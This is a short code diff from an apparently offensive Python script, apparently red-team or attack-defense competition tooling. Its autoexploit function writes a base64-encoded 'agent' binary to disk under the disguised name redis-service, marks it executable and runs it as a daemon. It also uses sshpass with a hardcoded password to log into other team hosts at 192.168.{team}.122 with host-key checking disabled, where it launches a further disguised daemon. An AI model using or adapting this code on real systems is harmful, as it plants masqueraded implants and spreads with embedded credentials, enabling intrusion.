@@ -163,8 +163,8 @@ def autoexploit(remote, team):
     print("\033[92m[+]\033[0m AutoExploitation...")
     with open("agent.b64") as f:
         contents = f.read()
-        out = remote.shell_cmd(f"echo '{contents}' | base64 -d > /bin/redis-service")
-    out = remote.shell_cmd("chmod +x /bin/redis-service")
+        out = remote.shell_cmd(f"echo '{contents}' | base64 -d > /tmp/redis-service")
+    out = remote.shell_cmd("chmod +x /tmp/redis-service")
     print(out)
 
     # Failed login
@@ -182,7 +182,7 @@ def autoexploit(remote, team):
     out = remote.shell_cmd(f"/tmp/sshpass -p '&pV5)f*_^1' /tmp/ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.122 'chmod +x redis && nohup ./redis daemon'")
     print(out)
     # Daemon running on redis server
-    out = remote.shell_cmd("/bin/redis-service daemon")
+    out = remote.shell_cmd("/tmp/redis-service daemon")
     print(out)
     
     print('Auto exploit done!')
